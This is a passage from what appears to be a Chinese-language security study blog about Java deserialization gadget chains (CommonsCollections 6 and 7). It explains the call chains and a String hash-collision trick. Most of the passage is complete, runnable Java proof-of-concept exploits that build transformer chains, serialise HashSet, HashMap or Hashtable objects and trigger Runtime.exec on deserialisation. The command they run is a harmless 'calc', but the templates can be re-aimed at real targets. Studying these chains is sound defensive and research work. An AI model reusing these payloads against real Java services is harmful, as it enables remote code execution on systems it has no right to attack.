class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②-白袍师傅改-yso"><a href="#②-白袍师傅改-yso" class="headerlink" title="② 白袍师傅改 yso"></a>② 白袍师傅改 yso</h4><p>很像 yso 的链，照猫画虎</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyBAIPAO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet();<br>        hs.add(tiedMapEntry);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但这个链和 yso 的还是有一定的差距的，这个链往<code>LazyMap-&gt;TiedMapEntry-&gt;HashSet</code>添加假链后反射修改，思路简单</p><h4 id="③yso"><a href="#③yso" class="headerlink" title="③yso"></a>③yso</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<span class="hljs-comment">//必须得设置值1 后续才能取值map</span><br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是 new 了一个为 1 的初化容量，加了一个无关紧要的键，通过反射取出<code>map(HashMap)</code>，再反射取出 在反射取出的<code>map</code>里面的<code>table</code>并置于一个 object 数组，数组做一个判断，取出非空的[0]或[1]元素</p><p>通过反射最后将添加的无关紧要的元素替换为 evil 链</p><p>有点难…</p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6</a></p><h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><h3 id="Pre-6"><a href="#Pre-6" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-6"><a href="#利用链-6" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure><h4 id="关键类-6"><a href="#关键类-6" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">HashTable</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><p>先不说具体的链，在这个链的地方发现一个很有趣的东西，先拿出来讲，作知识铺垫</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hash</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;yy&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;zZ&quot;</span>.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个东西叫<a href="https://www.h5w3.com/164057.html">hash 冲突</a>，我们看下代码<code>String#hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见是将 String 分为字符一位一位根据<strong>ASCII</strong>做一个运算</p><blockquote><p>yy：第一次 y 的 ascii121，第二次 31*121+121=3872</p><p>zZ：第一次 z 的 ascii122，第二次 31*122+90=3872</p></blockquote><p>还有其他的：</p><blockquote><p>CC == Bb<br>DD == Cc<br>BBBB == BBAa</p></blockquote><p>CC7 前半段仍然是用的 CC1 的链，CC1 中是通过<code>AnnotationInvocationHandler.invoke</code>来触发对恶意代理<code>handler</code>调用其<code>invoke</code>方法从而触发<code>LazyMap.get</code>方法，CC7 则是通过<code>AbstractMap.equals</code>来触发对<code>LazyMap.get</code>方法的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br></code></pre></td></tr></table></figure><p>这里 m 设置为<code>LazyMap</code>即可 RCE</p><p>进一步地使用了<code>HashTable</code>作为复写点，调用了<code>HashTable.reconstitutionPut</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br></code></pre></td></tr></table></figure><p>对应到<code>writeObject</code>可知，<code>HashTable.put</code>键值</p><p>这个不会写，直接贴出来</p><h3 id="Gadget-6"><a href="#Gadget-6" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        Map map1 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        Map map2 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">2</span>);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">2</span>);<br><br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(map1, <span class="hljs-number">2</span>);<br>        ht.put(map2, <span class="hljs-number">2</span>);<br>        map2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer, transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一些细节：</p><p><code>AbstractMap</code>是<code>HashMap</code>的父类，因此在<code>HashTable.reconstitutionPut</code>调用<code>LazyMap.equals</code>即可</p><p>第二个得<code>HashTable.put</code>两次，不然在复写点走进<code>reconstitutionPut</code>不会进入 for</p><p><code>Hashtable.put</code>方法新增的元素，是存储在<code>Hashtable$Entry</code>这个内部类里面的，那么获取元素也是在这个内部类获取的</p><p><code>LazyMap.put</code>方法新增的元素，是调用<code>LazyMap.map.put</code>方法新增的，当<code>map</code>属性为<code>HashMap</code>对象的时候，新增的元素是存储在<code>HashMap$Node</code>内部类里面的，注意<code>LazyMap</code>类没有 put 方法，调用的是其父类的 put 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> StreamCorruptedException</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span 